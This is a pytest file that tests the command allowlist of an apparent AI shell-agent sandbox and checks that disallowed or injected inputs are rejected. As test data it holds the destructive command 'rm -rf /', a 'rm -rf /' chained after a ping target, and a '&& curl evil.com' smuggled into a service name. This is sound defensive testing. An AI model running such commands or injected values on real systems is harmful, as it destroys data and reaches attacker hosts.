"""
Tests for the Shell Agent's command allowlist — this is the safety
boundary of the whole project, so it gets tested first and most
thoroughly.
"""

import pytest
from sandbox.allowlist import build_command, CommandNotAllowedError


def test_ping_with_valid_target():
    cmd = build_command("ping", target="localhost")
    assert cmd == "ping -c 4 localhost"


def test_command_not_in_allowlist_raises():
    with pytest.raises(CommandNotAllowedError):
        build_command("rm -rf /", target=None)


def test_ping_rejects_shell_injection_attempt():
    with pytest.raises(CommandNotAllowedError):
        build_command("ping", target="localhost; rm -rf /")


def test_command_without_parameter_ignores_target():
    cmd = build_command("disk_usage")
    assert cmd == "df -h"


def test_service_status_rejects_invalid_service_name():
    with pytest.raises(CommandNotAllowedError):
        build_command("service_status", target="nginx && curl evil.com")
